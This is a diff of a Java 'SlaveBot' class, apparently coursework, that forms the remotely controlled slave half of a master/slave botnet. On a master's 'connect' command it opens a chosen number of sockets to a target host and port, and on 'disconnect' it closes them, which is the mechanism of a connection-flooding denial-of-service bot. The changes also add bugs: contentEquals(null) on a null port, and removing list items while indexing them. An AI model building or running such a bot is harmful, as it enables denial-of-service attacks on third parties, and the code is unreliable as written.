@@ -8,6 +8,8 @@ import java.util.Map.Entry;
 
 
 
+
+
 public class SlaveBot implements Runnable {
 
 	static ServerSocket slavePort;
@@ -42,7 +44,8 @@ public class SlaveBot implements Runnable {
 			}        
 		}
 		catch (Exception e){
-			System.exit(-1);
+			System.out.println("could not accept the master data");
+			//System.exit(-1);
 			//System.out.println(e);
 		}
 	}
@@ -50,31 +53,31 @@ public class SlaveBot implements Runnable {
 	public static void extractTargetData(String targetData){
 		String delims = " ";
 		StringTokenizer st = new StringTokenizer(targetData, delims);
-		
+
 		String action  = (String)st.nextElement();
 		String targetHostName = ((String) st.nextElement());
-		String targetPortNumber = ((String) st.nextElement());
-		String numberOfConn = ((String)st.nextElement());
-		
-		storeTargetData(action, targetHostName, targetPortNumber, numberOfConn);
+		String targetPort = ((String) st.nextElement());
+		String numberOfConn;
+		//= ((String)st.nextElement());
+		if(st.hasMoreTokens())
+		{
+			numberOfConn = ((String)st.nextElement());
+		}
+		else{
+			numberOfConn = null;
+		}
+
+		storeTargetData(action, targetHostName, targetPort, numberOfConn);
 	}
 
 	public static void storeTargetData(String action, String targetHostName, String targetPortNumber, String numberOfConn){
 
-		String uniqueKey = concatinatedData(targetHostName, targetPortNumber);
-
-		/*
-		Set<Entry<String, targetData>> set = targetDataMap.entrySet();
-		Iterator<Entry<String, targetData>> iterator = set.iterator();	
-		while(iterator.hasNext()) {
-			Map.Entry slaveData = (Map.Entry)iterator.next();
-		}
-		*/
 
 		if (action.contentEquals("connect")){
+			String uniqueKey = concatinatedData(targetHostName, targetPortNumber);
 			// go create a object and insert into the hash table value first time
 			targetData targetObj;
-			
+
 			if (targetDataMap.containsKey(uniqueKey) == false)
 			{
 				targetObj = new targetData(action, targetHostName, targetPortNumber, numberOfConn);
@@ -84,16 +87,22 @@ public class SlaveBot implements Runnable {
 			{
 				targetObj =  targetDataMap.get(uniqueKey);
 			}
-			
+
 			performConnect(targetObj.targetHost, targetObj.port, numberOfConn);
 		}
-		else if (action.contentEquals("disconnect")){
-			// go get the object from the hash-table
-			targetData objFromHashTable =  targetDataMap.get(uniqueKey);
-			Integer numberOfConnToDelete = Integer.parseInt(numberOfConn);
-			performDisconnect(objFromHashTable.targetHost, objFromHashTable.port, numberOfConnToDelete);
-		}
 
+
+		else if (action.contentEquals("disconnect")){
+
+			if (targetPortNumber.contentEquals(null)){
+
+				performDisconnect(targetHostName, null);
+
+			}
+			else {
+				performDisconnect(targetHostName, targetPortNumber);
+			}
+		}
 	}
 
 	public static String concatinatedData(String ip, String port){
@@ -109,11 +118,11 @@ public class SlaveBot implements Runnable {
 			BufferedReader in = new BufferedReader(new InputStreamReader(client_socket.getInputStream()));
 
 			String ip=(((InetSocketAddress) client_socket.getRemoteSocketAddress()).getAddress()).toString().replace("/","");
-			Integer slavePort_int = (Integer) (client_socket.getLocalPort());
+			Integer slavePort_int = client_socket.getLocalPort();
 			String local_host = client_socket.getInetAddress().getHostAddress();
 
 			//System.out.println(ip + slavePort_int + local_host); //print here in slave just to confirm
-			
+
 			out.println(ip +","+ slavePort_int + "," + local_host);
 			return slavePort_int;
 
@@ -125,12 +134,14 @@ public class SlaveBot implements Runnable {
 
 	}
 
+
+
 	public static void performConnect(String ip, String port, String numConnection){
 		String conKey = concatinatedData(ip, port);
 		Integer numConnectionInt = Integer.parseInt(numConnection);
 		Integer portInt = Integer.parseInt(port);
 		targetData obj = targetDataMap.get(conKey);
-		
+
 		//obj.arrSoc = new Socket[numConnectionInt];		
 		if (targetDataMap.containsKey(conKey)){
 			try{
@@ -138,9 +149,9 @@ public class SlaveBot implements Runnable {
 					Socket socObj = new Socket(ip, portInt);
 					obj.arrSoc.add(socObj);
 					//obj.arrSoc[i] = new Socket(ip, portInt);
-					//System.out.println(obj.arrSoc[i]);
+					System.out.println("Connected to the target");
 				}
-				
+				listMap();
 			}
 			catch(Exception e){
 				System.out.println(e);
@@ -149,35 +160,65 @@ public class SlaveBot implements Runnable {
 		else{
 			System.out.println("Error Connecting to host");
 		}
-		
+
 		//System.out.println("total sockets" + obj.arrSoc.size());
 	}
 
-	public static void performDisconnect(String ip, String port, Integer numberOfConnToDelete) {
-		String uniqueKey = concatinatedData(ip, port);
-		Integer portInt = Integer.parseInt(port);
-		targetData obj = targetDataMap.get(uniqueKey);
 
-		if (targetDataMap.containsKey(uniqueKey)){
-			try{
-				for(int i = 0; i< numberOfConnToDelete; i++){
-					Socket deleteSoc = (Socket)obj.arrSoc.get(i);
-					deleteSoc.close();	
-					obj.arrSoc.remove(deleteSoc);
-					//System.out.println("Socket closed" + deleteSoc);
+
+	public static void performDisconnect(String ip, String port) {
+
+		if(port.contentEquals(null)){
+			for (Entry<String, targetData> entry : targetDataMap.entrySet()){
+				if(entry.getKey().startsWith(ip)){
+					targetData newObj = entry.getValue();
+					try{
+						int length = entry.getValue().arrSoc.size();
+						for (int i = 0; i< length; i++){
+							Socket deleteSoc = (Socket)entry.getValue().arrSoc.get(i);
+							deleteSoc.close();
+							entry.getValue().arrSoc.remove(deleteSoc);
+						}
+						listMap();
+					}
+					catch(Exception e){
+						System.exit(-1);
+					}
 				}
-				//targetDataMap.remove(uniqueKey);
-
 			}
-			catch(Exception e){
-				//System.out.println("Something went wrong");
-				System.exit(-1);
-			}
-
 		}
 
+		else{
+			String uniqueKey = concatinatedData(ip, port);
+			targetData obj = targetDataMap.get(uniqueKey);
+			if (targetDataMap.containsKey(uniqueKey)){
+				try{
+					int length = obj.arrSoc.size();
+					for (int i = 0; i< length; i++){
+						Socket deleteSoc = (Socket)obj.arrSoc.get(i);
+						deleteSoc.close();
+						obj.arrSoc.remove(deleteSoc);
+					}
+					listMap();
+				}
+				catch(Exception e){
+					//System.out.println("Something went wrong");
+					System.exit(-1);
+				}
+			}
+		}
 	}
 
+	public static void listMap(){
+		//	Set set = slaveDataMap.entrySet();
+		Iterator<Entry<String, targetData>> iter = targetDataMap.entrySet().iterator();
+		while (iter.hasNext()) {
+			Entry<String, targetData> entry = iter.next();
+			targetData localObj = entry.getValue();
+			System.out.print(localObj.targetHost + "\t" + localObj.port + "\t" + localObj.arrSoc + "\n");
+
+		}
+	}
 
 	public static void main(String[] args) throws Exception {
 		if(args.length != 4)
